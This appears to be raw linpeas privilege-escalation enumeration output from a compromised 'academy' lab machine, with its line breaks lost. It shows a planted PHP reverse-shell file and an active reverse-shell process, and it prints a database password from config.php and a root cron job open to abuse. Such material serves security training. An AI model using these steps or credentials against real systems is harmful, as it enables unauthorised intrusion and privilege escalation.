/tmp/linpeas.sh                                                                                             -rw-r--r-- 1 root root 11996 May 29  2021 /var/backups/apt.extended_states.0[+] Interesting writable Files[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                                 /dev/mqueue                                                                                                                                                    /dev/mqueue/linpeas.txt/dev/shm/run/lock/run/lock/apache2/sys/kernel/security/apparmor/.access/sys/kernel/security/apparmor/.load/sys/kernel/security/apparmor/.remove/sys/kernel/security/apparmor/.replace/tmp/tmp/linpeas.sh/var/cache/apache2/mod_cache_disk/var/lib/php/sessions/var/lib/phpmyadmin/var/lib/phpmyadmin/tmp/var/lib/phpmyadmin/tmp/twig/var/lib/phpmyadmin/tmp/twig/15/var/lib/phpmyadmin/tmp/twig/15/15a885ca9738e5a84084a3e52f1f6b23c771ea4f7bdca01081f7b87d3b86a6f9.php/var/lib/phpmyadmin/tmp/twig/21/var/lib/phpmyadmin/tmp/twig/21/21a3bee2bc40466295b888b9fec6fb9d77882a7cf061fd3f3d7194b5d54ab837.php/var/lib/phpmyadmin/tmp/twig/22/var/lib/phpmyadmin/tmp/twig/22/22f328e86274b51eb9034592ac106d133734cc8f4fba3637fe76b0a4b958f16d.php/var/lib/phpmyadmin/tmp/twig/28/var/lib/phpmyadmin/tmp/twig/28/28bcfd31671cb4e1cff7084a80ef5574315cd27a4f33c530bc9ae8da8934caf6.php/var/lib/phpmyadmin/tmp/twig/2e/var/lib/phpmyadmin/tmp/twig/2e/2e6ed961bffa8943f6419f806fe7bfc2232df52e39c5880878e7f34aae869dd9.php/var/lib/phpmyadmin/tmp/twig/31/var/lib/phpmyadmin/tmp/twig/31/317c8816ee34910f2c19f0c2bd6f261441aea2562acc0463975f80a4f0ed98a9.php/var/lib/phpmyadmin/tmp/twig/36/var/lib/phpmyadmin/tmp/twig/36/360a7a01227c90acf0a097d75488841f91dc2939cebca8ee28845b8abccb62ee.php/var/lib/phpmyadmin/tmp/twig/3b/var/lib/phpmyadmin/tmp/twig/3b/3bf8a6b93e8c4961d320a65db6c6f551428da6ae8b8e0c87200629b4ddad332d.php/var/lib/phpmyadmin/tmp/twig/41/var/lib/phpmyadmin/tmp/twig/41/4161342482a4d1436d31f5619bbdbd176c50e500207e3f364662f5ba8210fe31.php/var/lib/phpmyadmin/tmp/twig/42/var/lib/phpmyadmin/tmp/twig/42/426cadcf834dab31a9c871f8a7c8eafa83f4c66a2297cfefa7aae7a7895fa955.php/var/lib/phpmyadmin/tmp/twig/43/var/lib/phpmyadmin/tmp/twig/43/43cb8c5a42f17f780372a6d8b976cafccd1f95b8656d9d9638fca2bb2c0c1ee6.php/var/lib/phpmyadmin/tmp/twig/4c/var/lib/phpmyadmin/tmp/twig/4c/4c13e8023eae0535704510f289140d5447e25e2dea14eaef5988afa2ae915cb9.php/var/lib/phpmyadmin/tmp/twig/4e/var/lib/phpmyadmin/tmp/twig/4e/4e68050e4aec7ca6cfa1665dd465a55a5d643fca6abb104a310e5145d7310851.php/var/lib/phpmyadmin/tmp/twig/4e/4e8f70ab052f0a5513536d20f156e0649e1791c083804a629624d2cb1e052f1f.php/var/lib/phpmyadmin/tmp/twig/4f/var/lib/phpmyadmin/tmp/twig/4f/4f7c1ace051b6b8cb85528aa8aef0052b72277f654cb4f13f2fc063f8529efe4.php/var/lib/phpmyadmin/tmp/twig/53/var/lib/phpmyadmin/tmp/twig/53/53ec6cf1deb6f8f805eb3077b06e6ef3b7805e25082d74c09563f91a11c1dfcd.php/var/lib/phpmyadmin/tmp/twig/5c/var/lib/phpmyadmin/tmp/twig/5c/5cf13d5a4ba7434d92bc44defee51a93cfbafa0d7984fcb8cbea606d97fe3e1a.php/var/lib/phpmyadmin/tmp/twig/61/var/lib/phpmyadmin/tmp/twig/61/61cf92e037fb131bad1ea24485b8e2ab7f0dd05dbe0bcdec85d8a96c80458223.php/var/lib/phpmyadmin/tmp/twig/6b/var/lib/phpmyadmin/tmp/twig/6b/6b8deef855b316d17c87795aebdf5aa33b55fae3e6c453d2a5bab7c4085f85d7.php/var/lib/phpmyadmin/tmp/twig/6c/var/lib/phpmyadmin/tmp/twig/6c/6c9a7cd11578d393beebc51daa9a48d35c8b03d3a69fd786c55ceedf71a62d29.php/var/lib/phpmyadmin/tmp/twig/73/var/lib/phpmyadmin/tmp/twig/73/73a22388ea06dda0a2e91e156573fc4c47961ae6e35817742bb6901eb91d5478.php/var/lib/phpmyadmin/tmp/twig/73/73ee99e209023ff62597f3f6e5f027a498c1261e4d35d310b0d0a2664f3c2c0d.php/var/lib/phpmyadmin/tmp/twig/78/var/lib/phpmyadmin/tmp/twig/78/786fc5d49e751f699117fbb46b2e5920f5cdae9b5b3e7bb04e39d201b9048164.php/var/lib/phpmyadmin/tmp/twig/7d/var/lib/phpmyadmin/tmp/twig/7d/7d8087d41c482579730682151ac3393f13b0506f63d25d3b07db85fcba5cdbeb.php/var/lib/phpmyadmin/tmp/twig/7f/var/lib/phpmyadmin/tmp/twig/7f/7f2fea86c14cdbd8cd63e93670d9fef0c3d91595972a398d9aa8d5d919c9aa63.php/var/lib/phpmyadmin/tmp/twig/8a/var/lib/phpmyadmin/tmp/twig/8a/8a16ca4dbbd4143d994e5b20d8e1e088f482b5a41bf77d34526b36523fc966d7.php/var/lib/phpmyadmin/tmp/twig/8b/var/lib/phpmyadmin/tmp/twig/8b/8b3d6e41c7dc114088cc4febcf99864574a28c46ce39fd02d9577bec9ce900de.php/var/lib/phpmyadmin/tmp/twig/96/var/lib/phpmyadmin/tmp/twig/96/96885525f00ce10c76c38335c2cf2e232a709122ae75937b4f2eafcdde7be991.php/var/lib/phpmyadmin/tmp/twig/97/var/lib/phpmyadmin/tmp/twig/97/9734627c3841f4edcd6c2b6f193947fc0a7a9a69dd1955f703f4f691af6b45e3.php/var/lib/phpmyadmin/tmp/twig/99/var/lib/phpmyadmin/tmp/twig/99/9937763182924ca59c5731a9e6a0d96c77ec0ca5ce3241eec146f7bca0a6a0dc.php/var/lib/phpmyadmin/tmp/twig/9d/var/lib/phpmyadmin/tmp/twig/9d/9d254bc0e43f46a8844b012d501626d3acdd42c4a2d2da29c2a5f973f04a04e8.php/var/lib/phpmyadmin/tmp/twig/9d/9d6c5c59ee895a239eeb5956af299ac0e5eb1a69f8db50be742ff0c61b618944.php/var/lib/phpmyadmin/tmp/twig/9e/var/lib/phpmyadmin/tmp/twig/9e/9ed23d78fa40b109fca7524500b40ca83ceec9a3ab64d7c38d780c2acf911588.php/var/lib/phpmyadmin/tmp/twig/a0/var/lib/phpmyadmin/tmp/twig/a0/a0c00a54b1bb321f799a5f4507a676b317067ae03b1d45bd13363a544ec066b7.php/var/lib/phpmyadmin/tmp/twig/a4/var/lib/phpmyadmin/tmp/twig/a4/a49a944225d69636e60c581e17aaceefffebe40aeb5931afd4aaa3da6a0039b9.php/var/lib/phpmyadmin/tmp/twig/a7/var/lib/phpmyadmin/tmp/twig/a7/a7e9ef3e1f57ef5a497ace07803123d1b50decbe0fcb448cc66573db89b48e25.php/var/lib/phpmyadmin/tmp/twig/ae/var/lib/phpmyadmin/tmp/twig/ae/ae25b735c0398c0c6a34895cf07f858207e235cf453cadf07a003940bfb9cd05.php/var/lib/phpmyadmin/tmp/twig/af/var/lib/phpmyadmin/tmp/twig/af/af668e5234a26d3e85e170b10e3d989c2c0c0679b2e5110d593a80b4f58c6443.php/var/lib/phpmyadmin/tmp/twig/af/af6dd1f6871b54f086eb95e1abc703a0e92824251df6a715be3d3628d2bd3143.php/var/lib/phpmyadmin/tmp/twig/af/afa81ff97d2424c5a13db6e43971cb716645566bd8d5c987da242dddf3f79817.php/var/lib/phpmyadmin/tmp/twig/b6/var/lib/phpmyadmin/tmp/twig/b6/b6c8adb0e14792534ce716cd3bf1d57bc78d45138e62be7d661d75a5f03edcba.php/var/lib/phpmyadmin/tmp/twig/c3/var/lib/phpmyadmin/tmp/twig/c3/c34484a1ece80a38a03398208a02a6c9c564d1fe62351a7d7832d163038d96f4.php/var/lib/phpmyadmin/tmp/twig/c5/var/lib/phpmyadmin/tmp/twig/c5/c50d1c67b497a887bc492962a09da599ee6c7283a90f7ea08084a548528db689.php/var/lib/phpmyadmin/tmp/twig/c7/var/lib/phpmyadmin/tmp/twig/c7/c70df99bff2eea2f20aba19bbb7b8d5de327cecaedb5dc3d383203f7d3d02ad2.php/var/lib/phpmyadmin/tmp/twig/ca/var/lib/phpmyadmin/tmp/twig/ca/ca32544b55a5ebda555ff3c0c89508d6e8e139ef05d8387a14389443c8e0fb49.php/var/lib/phpmyadmin/tmp/twig/d6/var/lib/phpmyadmin/tmp/twig/d6/d66c84e71db338af3aae5892c3b61f8d85d8bb63e2040876d5bbb84af484fb41.php/var/lib/phpmyadmin/tmp/twig/dd/var/lib/phpmyadmin/tmp/twig/dd/dd1476242f68168118c7ae6fc7223306d6024d66a38b3461e11a72d128eee8c1.php/var/lib/phpmyadmin/tmp/twig/e8/var/lib/phpmyadmin/tmp/twig/e8/e8184cd61a18c248ecc7e06a3f33b057e814c3c99a4dd56b7a7da715e1bc2af8.php/var/lib/phpmyadmin/tmp/twig/e9/var/lib/phpmyadmin/tmp/twig/e9/e93db45b0ff61ef08308b9a87b60a613c0a93fab9ee661c8271381a01e2fa57a.php/var/lib/phpmyadmin/tmp/twig/f5/var/lib/phpmyadmin/tmp/twig/f5/f589c1ad0b7292d669068908a26101f0ae7b5db110ba174ebc5492c80bc08508.php/var/lib/phpmyadmin/tmp/twig/fa/var/lib/phpmyadmin/tmp/twig/fa/fa249f377795e48c7d92167e29cef2fc31f50401a0bdbc95ddb51c0aec698b9e.php/var/tmp/var/www/html/academy/var/www/html/academy/admin/var/www/html/academy/admin/assets/var/www/html/academy/admin/assets/css/var/www/html/academy/admin/assets/css/bootstrap.css/var/www/html/academy/admin/assets/css/font-awesome.css/var/www/html/academy/admin/assets/css/style.css/var/www/html/academy/admin/assets/fonts/var/www/html/academy/admin/assets/fonts/FontAwesome.otf/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.eot/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.svg/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.ttf/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff2/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.eot/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.svg/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.ttf/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.woff/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.woff2/var/www/html/academy/admin/assets/img/var/www/html/academy/admin/assets/js/var/www/html/academy/admin/assets/js/bootstrap.js/var/www/html/academy/admin/assets/js/jquery-1.11.1.js/var/www/html/academy/admin/change-password.php/var/www/html/academy/admin/check_availability.php/var/www/html/academy/admin/course.php/var/www/html/academy/admin/department.php/var/www/html/academy/admin/edit-course.php/var/www/html/academy/admin/enroll-history.php/var/www/html/academy/admin/includes/var/www/html/academy/admin/includes/config.php/var/www/html/academy/admin/includes/footer.php/var/www/html/academy/admin/includes/header.php/var/www/html/academy/admin/includes/menubar.php/var/www/html/academy/admin/index.php/var/www/html/academy/admin/level.php/var/www/html/academy/admin/logout.php/var/www/html/academy/admin/manage-students.php/var/www/html/academy/admin/print.php/var/www/html/academy/admin/semester.php/var/www/html/academy/admin/session.php/var/www/html/academy/admin/student-registration.php/var/www/html/academy/admin/user-log.php/var/www/html/academy/assets/var/www/html/academy/assets/css/var/www/html/academy/assets/css/bootstrap.css/var/www/html/academy/assets/css/font-awesome.css/var/www/html/academy/assets/css/style.css/var/www/html/academy/assets/fonts/var/www/html/academy/assets/fonts/FontAwesome.otf/var/www/html/academy/assets/fonts/fontawesome-webfont.eot/var/www/html/academy/assets/fonts/fontawesome-webfont.svg/var/www/html/academy/assets/fonts/fontawesome-webfont.ttf/var/www/html/academy/assets/fonts/fontawesome-webfont.woff/var/www/html/academy/assets/fonts/fontawesome-webfont.woff2/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.eot/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.svg/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.ttf/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.woff/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.woff2/var/www/html/academy/assets/img/var/www/html/academy/assets/js/var/www/html/academy/assets/js/bootstrap.js/var/www/html/academy/assets/js/jquery-1.11.1.js/var/www/html/academy/change-password.php/var/www/html/academy/check_availability.php/var/www/html/academy/db/var/www/html/academy/db/onlinecourse.sql/var/www/html/academy/enroll-history.php/var/www/html/academy/enroll.php/var/www/html/academy/includes/var/www/html/academy/includes/config.php/var/www/html/academy/includes/footer.php/var/www/html/academy/includes/header.php/var/www/html/academy/includes/menubar.php/var/www/html/academy/index.php/var/www/html/academy/logout.php/var/www/html/academy/my-profile.php/var/www/html/academy/pincode-verification.php/var/www/html/academy/print.php/var/www/html/academy/studentphoto/var/www/html/academy/studentphoto/php-rev.php/tmp/linpeas.sh/dev/mqueue/linpeas.txt[+] Searching passwords in config PHP files$mysql_password = "My_V3ryS3cur3_P4ss";                                                                                                                        $mysql_password = "My_V3ryS3cur3_P4ss";[+] Finding IPs inside logs (limit 100)     44 /var/log/dpkg.log.1:1.8.2.1                                                                                                                                 24 /var/log/dpkg.log.1:1.8.2.3     14 /var/log/dpkg.log.1:1.8.4.3      9 /var/log/wtmp:192.168.10.31      7 /var/log/dpkg.log.1:7.43.0.2      7 /var/log/dpkg.log.1:4.8.6.1      7 /var/log/dpkg.log.1:1.7.3.2      7 /var/log/dpkg.log.1:0.5.10.2      7 /var/log/dpkg.log.1:0.19.8.1      4 /var/log/installer/status:1.2.3.3      1 /var/log/lastlog:192.168.10.31[+] Finding passwords inside logs (limit 100)/var/log/dpkg.log.1:2021-05-29 17:00:10 install base-passwd:amd64 <none> 3.5.46                                                                                /var/log/dpkg.log.1:2021-05-29 17:00:10 status half-installed base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:11 configure base-passwd:amd64 3.5.46 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:11 status half-configured base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:11 status installed base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:11 status unpacked base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:18 status half-configured base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:18 status half-installed base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:18 status unpacked base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:18 upgrade base-passwd:amd64 3.5.46 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:21 install passwd:amd64 <none> 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:21 status half-installed passwd:amd64 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:21 status unpacked passwd:amd64 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:24 configure base-passwd:amd64 3.5.46 <none>/var/log/dpkg.log.1:2021-05-29 17:00:24 status half-configured base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:24 status installed base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:24 status unpacked base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:25 configure passwd:amd64 1:4.5-1.1 <none>/var/log/dpkg.log.1:2021-05-29 17:00:25 status half-configured passwd:amd64 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:25 status installed passwd:amd64 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:25 status unpacked passwd:amd64 1:4.5-1.1/var/log/installer/status:Description: Set up users and passwords[+] Finding emails inside logs (limit 100)      1 /var/log/installer/status:aeb@debian.org                                                                                                                     1 /var/log/installer/status:anibal@debian.org      2 /var/log/installer/status:berni@debian.org     40 /var/log/installer/status:debian-boot@lists.debian.org     16 /var/log/installer/status:debian-kernel@lists.debian.org      1 /var/log/installer/status:debian-med-packaging@lists.alioth.debian.org      1 /var/log/installer/status:debian@jff.email      1 /var/log/installer/status:djpig@debian.org      4 /var/log/installer/status:gcs@debian.org      2 /var/log/installer/status:guillem@debian.org      1 /var/log/installer/status:guus@debian.org      1 /var/log/installer/status:linux-xfs@vger.kernel.org      2 /var/log/installer/status:mmind@debian.org      1 /var/log/installer/status:open-iscsi@packages.debian.org      1 /var/log/installer/status:open-isns@packages.debian.org      1 /var/log/installer/status:packages@release.debian.org      2 /var/log/installer/status:parted-maintainers@alioth-lists.debian.net      1 /var/log/installer/status:petere@debian.org      2 /var/log/installer/status:pkg-gnupg-maint@lists.alioth.debian.org      1 /var/log/installer/status:pkg-gnutls-maint@lists.alioth.debian.org      1 /var/log/installer/status:pkg-grub-devel@alioth-lists.debian.net      1 /var/log/installer/status:pkg-mdadm-devel@lists.alioth.debian.org      1 /var/log/installer/status:rogershimizu@gmail.com      2 /var/log/installer/status:team+lvm@tracker.debian.org      1 /var/log/installer/status:tytso@mit.edu      1 /var/log/installer/status:wpa@packages.debian.org      1 /var/log/installer/status:xnox@debian.org[+] Finding *password* or *credential* files in home                                                                                                                                                               [+] Finding 'pwd' or 'passw' string inside /home, /var/www, /etc, /root and list possible web(/var/www) and config(/etc) passwords/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff2                                                                                             /var/www/html/academy/admin/assets/js/jquery-1.11.1.js/var/www/html/academy/admin/change-password.php/var/www/html/academy/admin/includes/config.php/var/www/html/academy/admin/index.php/var/www/html/academy/admin/manage-students.php/var/www/html/academy/admin/student-registration.php/var/www/html/academy/assets/fonts/fontawesome-webfont.woff2/var/www/html/academy/assets/js/jquery-1.11.1.js/var/www/html/academy/change-password.php/var/www/html/academy/db/onlinecourse.sql/var/www/html/academy/includes/config.php/var/www/html/academy/includes/menubar.php/var/www/html/academy/index.php/var/www/html/academy/pincode-verification.php/var/www/html/academy/admin/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";/var/www/html/academy/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";/etc/apache2/sites-available/default-ssl.conf:          #        Note that no password is obtained from the user. Every entry in the user/etc/apache2/sites-available/default-ssl.conf:          #        file needs this password: `xxj31ZMTZzkVA'./etc/apparmor.d/abstractions/authentication:  # databases containing passwords, PAM configuration files, PAM libraries/etc/debconf.conf:Accept-Type: password/etc/debconf.conf:Filename: /var/cache/debconf/passwords.dat/etc/debconf.conf:Name: passwords/etc/debconf.conf:Reject-Type: password/etc/debconf.conf:Stack: config, passwordsLinux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist LEYEND:                                                                                                                                                         RED/YELLOW: 99% a PE vector  RED: You must take a look at it  LightCyan: Users with console  Blue: Users without console & mounted devs  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)   LightMangenta: Your username====================================( Basic information )=====================================OS: Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)                  User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)Hostname: academyWritable folder: /dev/shm[+] /usr/bin/ping is available for network discovery (You can use linpeas to discover hosts, learn more with -h)[+] /usr/bin/nc is available for network discover & port scanning (You can use linpeas to discover hosts/port scanning, learn more with -h)                                                                                                                                                                                   ====================================( System Information )====================================[+] Operative system                                                                                                                                           [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                                                                Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)                      Distributor ID: DebianDescription:    Debian GNU/Linux 10 (buster)Release:        10Codename:       buster[+] Sudo versionsudo Not Found                                                                                                                                                                                                                                                                                                                [+] PATH[i] Any writable folder in original PATH? (a new completed path will be exported)                                                                              /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                                   New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin[+] DateSat Jul 29 06:37:17 EDT 2023                                                                                                                                   [+] System statsFilesystem      Size  Used Avail Use% Mounted on                                                                                                               /dev/sda1       6.9G  1.9G  4.7G  29% /udev            479M     0  479M   0% /devtmpfs           494M     0  494M   0% /dev/shmtmpfs            99M  4.3M   95M   5% /runtmpfs           5.0M     0  5.0M   0% /run/locktmpfs           494M     0  494M   0% /sys/fs/cgrouptmpfs            99M     0   99M   0% /run/user/0              total        used        free      shared  buff/cache   availableMem:        1009960      178916      474532       10816      356512      640884Swap:        998396           0      998396[+] Environment[i] Any private information inside environment variables?                                                                                                      HISTFILESIZE=0                                                                                                                                                 APACHE_RUN_DIR=/var/run/apache2APACHE_PID_FILE=/var/run/apache2/apache2.pidJOURNAL_STREAM=9:13967PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binINVOCATION_ID=d29a7dcbdfb3443ebe10d76ee30417d9APACHE_LOCK_DIR=/var/lock/apache2LANG=CHISTSIZE=0APACHE_RUN_USER=www-dataAPACHE_RUN_GROUP=www-dataAPACHE_LOG_DIR=/var/log/apache2HISTFILE=/dev/null[+] Looking for Signature verification failed in dmseg Not Found                                                                                                                                                                                                                                                                                                                    [+] selinux enabled? .......... sestatus Not Found[+] Printer? .......... lpstat Not Found                                                                                                                       [+] Is this a container? .......... No                                                                                                                         [+] Is ASLR enabled? .......... Yes                                                                                                                            =========================================( Devices )==========================================[+] Any sd* disk in /dev? (limit 20)                                                                                                                           sda                                                                                                                                                            sda1sda2sda5[+] Unmounted file-system?[i] Check if you can mount umounted devices                                                                                                                    UUID=24d0cea7-c37b-4fd6-838e-d05cfb61a601 /               ext4    errors=remount-ro 0       1                                                                  UUID=930c51cc-089d-42bd-8e30-f08b86c52dca none            swap    sw              0       0/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0====================================( Available Software )====================================[+] Useful software?                                                                                                                                           /usr/bin/nc                                                                                                                                                    /usr/bin/netcat/usr/bin/nc.traditional/usr/bin/wget/usr/bin/ping/usr/bin/base64/usr/bin/socat/usr/bin/python/usr/bin/python2/usr/bin/python3/usr/bin/python2.7/usr/bin/python3.7/usr/bin/perl/usr/bin/php[+] Installed compilers?Compilers Not Found                                                                                                                                                                                                                                                                                                           ================================( Processes, Cron & Services )================================[+] Cleaned processes                                                                                                                                          [i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                       USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND                                                                                       root         1  0.0  0.9 103796  9972 ?        Ss   05:18   0:01 /sbin/initroot       324  0.0  0.7  40376  7976 ?        Ss   05:18   0:00 /lib/systemd/systemd-journaldroot       349  0.0  0.4  21932  4952 ?        Ss   05:18   0:00 /lib/systemd/systemd-udevdsystemd+   434  0.0  0.6  93084  6556 ?        Ssl  05:18   0:00 /lib/systemd/systemd-timesyncdroot       465  0.0  0.2   8504  2736 ?        Ss   05:18   0:00 /usr/sbin/cron -froot       470  0.0  0.7  19492  7244 ?        Ss   05:18   0:00 /lib/systemd/systemd-logindmessage+   472  0.0  0.4   8980  4348 ?        Ss   05:18   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-onlyroot       473  0.0  0.4 225824  4332 ?        Ssl  05:18   0:00 /usr/sbin/rsyslogd -n -iNONEroot       475  0.0  0.2   6620  2808 ?        Ss   05:18   0:00 /usr/sbin/vsftpd /etc/vsftpd.confroot       477  0.0  0.3   6924  3376 tty1     Ss   05:18   0:00 /bin/login -p --root       486  0.0  0.6  15852  6876 ?        Ss   05:18   0:00 /usr/sbin/sshd -Droot       521  0.0  2.2 214992 23008 ?        Ss   05:18   0:00 /usr/sbin/apache2 -k startmysql      541  0.0  8.9 1274452 90652 ?       Ssl  05:18   0:03 /usr/sbin/mysqldwww-data   544  0.0  1.2 215348 13032 ?        S    05:18   0:00 /usr/sbin/apache2 -k startroot       634  0.0  0.8  21024  8488 ?        Ss   05:18   0:00 /lib/systemd/systemd --userroot       635  0.0  0.2  22832  2264 ?        S    05:18   0:00 (sd-pam)root       639  0.0  0.4   7652  4444 tty1     S+   05:18   0:00 -bashroot       643  0.0  0.5   9488  5592 ?        Ss   05:18   0:00 dhclientroot      1051  0.0  0.5   9488  5688 ?        Ss   06:07   0:00 dhclientwww-data  1075  0.0  1.2 215340 13024 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1128  0.0  1.6 215340 17168 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1129  0.0  1.9 215460 19852 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1137  0.0  1.9 215460 19540 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1147  0.0  1.9 215460 19652 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1151  0.0  2.3 218640 23700 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1157  0.0  1.2 215348 12772 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1163  0.0  1.2 215340 12756 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1172  0.0  1.9 215576 19836 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1583  0.0  0.0   2388   756 ?        S    06:33   0:00 sh -c uname -a; w; id; /bin/sh -iwww-data  1587  0.0  0.0   2388   752 ?        S    06:33   0:00 /bin/sh -iwww-data  1624  1.0  0.1   2520  1628 ?        S    06:37   0:00 /bin/sh ./linpeas.shwww-data  1805  0.0  0.2   7640  2728 ?        R    06:37   0:00 ps aux[+] Binary processes permissions[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                                       56K -rwxr-xr-x 1 root root  56K Jul 27  2018 /bin/login                                                                                                          0 lrwxrwxrwx 1 root root    4 May 29  2021 /bin/sh -> dash1.5M -rwxr-xr-x 1 root root 1.5M Mar 18  2021 /lib/systemd/systemd144K -rwxr-xr-x 1 root root 143K Mar 18  2021 /lib/systemd/systemd-journald228K -rwxr-xr-x 1 root root 227K Mar 18  2021 /lib/systemd/systemd-logind 56K -rwxr-xr-x 1 root root  55K Mar 18  2021 /lib/systemd/systemd-timesyncd664K -rwxr-xr-x 1 root root 663K Mar 18  2021 /lib/systemd/systemd-udevd   0 lrwxrwxrwx 1 root root   20 Mar 18  2021 /sbin/init -> /lib/systemd/systemd236K -rwxr-xr-x 1 root root 236K Jul  5  2020 /usr/bin/dbus-daemon672K -rwxr-xr-x 1 root root 672K Aug 25  2020 /usr/sbin/apache2 56K -rwxr-xr-x 1 root root  55K Oct 11  2019 /usr/sbin/cron 20M -rwxr-xr-x 1 root root  20M Nov 25  2020 /usr/sbin/mysqld688K -rwxr-xr-x 1 root root 686K Feb 26  2019 /usr/sbin/rsyslogd792K -rwxr-xr-x 1 root root 789K Jan 31  2020 /usr/sbin/sshd164K -rwxr-xr-x 1 root root 161K Mar  6  2019 /usr/sbin/vsftpd[+] Cron jobs[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-jobs                                                                                 -rw-r--r-- 1 root root 1077 Jun 16  2021 /etc/crontab                                                                                                          /etc/cron.d:total 16drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder-rw-r--r--  1 root root  712 Dec 17  2018 php/etc/cron.daily:total 40drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder-rwxr-xr-x  1 root root  539 Aug  8  2020 apache2-rwxr-xr-x  1 root root 1478 May 12  2020 apt-compat-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils-rwxr-xr-x  1 root root 1187 Apr 18  2019 dpkg-rwxr-xr-x  1 root root  377 Aug 28  2018 logrotate-rwxr-xr-x  1 root root 1123 Feb 10  2019 man-db-rwxr-xr-x  1 root root  249 Sep 27  2017 passwd/etc/cron.hourly:total 12drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder/etc/cron.monthly:total 12drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder/etc/cron.weekly:total 16drwxr-xr-x  2 root root 4096 May 29  2021 .drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder-rwxr-xr-x  1 root root  813 Feb 10  2019 man-dbSHELL=/bin/shPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin* * * * * /home/grimmie/backup.sh[+] Services[i] Search for outdated versions                                                                                                                                [ - ]  apache-htcacheclean                                                                                                                                     [ + ]  apache2 [ + ]  apparmor [ - ]  console-setup.sh [ + ]  cron [ + ]  dbus [ - ]  hwclock.sh [ - ]  keyboard-setup.sh [ + ]  kmod [ + ]  mysql [ + ]  networking [ + ]  procps [ - ]  rsync [ + ]  rsyslog [ + ]  ssh [ + ]  udev [ + ]  vsftpd===================================( Network Information )====================================[+] Hostname, hosts and DNS                                                                                                                                    academy                                                                                                                                                        127.0.0.1       